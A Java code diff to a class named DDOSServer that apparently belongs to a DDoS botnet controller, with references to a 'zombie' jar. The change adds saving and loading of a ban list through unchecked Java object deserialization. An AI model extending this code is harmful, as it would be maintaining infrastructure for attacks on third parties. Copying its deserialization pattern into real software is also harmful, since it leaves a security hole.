@@ -3,8 +3,12 @@ package org.ddos.server;
 import java.io.BufferedReader;
 import java.io.EOFException;
 import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
 import java.io.FileReader;
 import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
 import java.io.Serializable;
 import java.net.SocketAddress;
 import java.net.SocketException;
@@ -29,6 +33,7 @@ public class DDOSServer implements ClientConnectionListener, ClientDisconnection
 			System.getProperty("user.dir") + "\\DeliminationCoreZombie.jar");
 	private static final File CLIENT_JAR_FILE = new File(
 			System.getProperty("user.dir") + "\\DeliminationCoreClient.jar");
+	private static final File BANLIST_FILE = new File(System.getProperty("user.dir") + "\\Banlist.txt");
 
 	private static String CLIENT_JAR_CODE;
 
@@ -44,6 +49,16 @@ public class DDOSServer implements ClientConnectionListener, ClientDisconnection
 	private Status status = new Status();
 	private ArrayList<Computer> banList = new ArrayList<>();
 	public ArrayList<SocketPackage> readingClients = new ArrayList<>();
+
+	public DDOSServer() {
+		try (FileInputStream fin = new FileInputStream(BANLIST_FILE)) {
+			try (ObjectInputStream oin = new ObjectInputStream(fin)) {
+				banList = new ArrayList<>(Arrays.asList((Computer[]) oin.readObject()));
+			}
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
 
 	public Server getServer() {
 		return server;
@@ -151,18 +166,34 @@ public class DDOSServer implements ClientConnectionListener, ClientDisconnection
 
 	public void setBanlist(Computer... banList) {
 		this.banList = new ArrayList<>(Arrays.asList(banList));
+
+		serializeBanlist();
 	}
 
 	public void ban(Computer computer) {
 		this.banList.add(computer);
+
+		serializeBanlist();
 	}
 
 	public void unban(Computer computer) {
 		this.banList.remove(computer);
+
+		serializeBanlist();
 	}
 
 	public boolean isBanned(Computer computer) {
 		return this.banList.contains(computer);
+	}
+
+	private void serializeBanlist() {
+		try (FileOutputStream fin = new FileOutputStream(BANLIST_FILE)) {
+			try (ObjectOutputStream oin = new ObjectOutputStream(fin)) {
+				oin.writeObject(banList.toArray(new Computer[banList.size()]));
+			}
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
 	}
 
 	public boolean isBanned(SocketAddress addr) {
